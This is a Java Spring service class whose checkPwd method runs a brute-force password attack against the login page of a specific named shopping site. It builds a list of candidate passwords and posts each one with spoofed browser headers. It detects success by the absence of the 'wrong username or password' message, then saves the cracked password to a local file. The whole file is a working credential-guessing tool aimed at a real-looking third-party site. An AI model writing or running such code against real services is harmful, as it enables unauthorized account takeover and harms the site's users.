package com.lsy.pc.service;

import com.lsy.pc.utils.PwdUtils;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;

@Service
public class OPPOService {
    @Autowired
    private RestTemplate restTemplate;

    private static String err = "错误的用户名或密码！";


    public void checkPwd(String name,Long pwd, int digit) {
        List<String> pwdList = PwdUtils.getPwd(digit, pwd);
        String url = "http://shoppo.nesdo.cn/Login_Wap.aspx";
        Connection connect = Jsoup.connect(url);
        HashMap<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/x-www-form-urlencoded");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        headers.put("Cache-Control", "max-age=0");
        headers.put("Connection", "keep-alive");
        headers.put("Origin", "http://shoppo.nesdo.cn");
        headers.put("Referer", "http://shoppo.nesdo.cn/Login_Wap.aspx");
        headers.put("Upgrade-Insecure-Requests", "1");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36");

        HashMap<String, String> datas = new HashMap<>();
        datas.put("__EVENTTARGET", "");
        datas.put("__EVENTARGUMENT", "");
        datas.put("TbUser", name);
        datas.put("CmdLogin", "登录");
        assert pwdList != null;
        pwdList.forEach(p->{
            datas.put("TbPass", p);
            try {
                Connection connection = connect.headers(headers).data(datas);
                Document post = connection.post();
                Elements fonts = post.body().select("font");
                boolean b = fonts.stream().anyMatch(f -> f.toString().contains(err));
                if (b) {
                    System.out.println("[" + name + "]尝试密码:[" + p + "]错误");
                } else {
                    System.out.println("!!!!!!!!!!!!!!!!!!" + p);
                    File file = new File("C:\\Users\\lsy\\IdeaProjects\\pc\\src\\main\\resources\\txt\\aa");
                    file.exists();
                    BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));
                    bufferedWriter.write(p);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    throw new RuntimeException("密码为:" + p);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

    }


}
